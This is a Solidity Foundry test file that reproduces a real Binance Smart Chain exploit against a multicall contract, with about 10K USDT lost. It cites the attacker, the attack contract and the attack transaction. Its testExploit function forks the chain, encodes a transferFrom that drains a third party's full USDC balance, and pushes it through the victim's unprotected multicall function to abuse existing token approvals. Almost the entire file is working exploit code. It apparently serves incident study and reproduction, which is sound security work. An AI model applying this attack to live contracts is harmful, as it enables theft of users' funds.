//  SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;


import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~10 K usdt
// Original Attacker : https://bscscan.com/address/0x726fb298168c89d5dce9a578668ab156c7e7be67
// Attack Contract : https://bscscan.com/address/0x756d614e3d277baea260f64cc2ab9a3ac89877d3
// Vulnerable Contract: https://bscscan.com/address/0x3da0f00d5c4e544924bc7282e18497c4a4c92046
// Attack Tx : https://bscscan.com/tx/0x6da7be6edf3176c7c4b15064937ee7148031f92a4b72043ae80a2b3403ab6302



contract MulticallWithETH is Test {
    address USDC = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;
    address victim=0x3DA0F00d5c4E544924bC7282E18497C4A4c92046;

         struct Call {
                address target;
                bytes callData;
                uint256 value;
                bool allowFailure;
            }
            

    function setUp() public {
        vm.createSelectFork("bsc", 55371342);
    }

    function testExploit() public {
      bytes memory data=abi.encodeWithSelector(0x23b872dd,address(0xfb0De204791110Caa5535aeDf4E71dF5bA68A581),address(this),IERC20(USDC).balanceOf(address(0xfb0De204791110Caa5535aeDf4E71dF5bA68A581)));
            Call[] memory call = new Call[](1);
            call[0] = Call({
                target: address(USDC),
                callData: data,
                value: 0,
                allowFailure: false
            });


         
        address(victim).call(abi.encodeWithSelector(0xc9586258, call));

        emit log_named_decimal_uint("Balance after the attack",IERC20(USDC).balanceOf(address(this)), 18);
    }


}

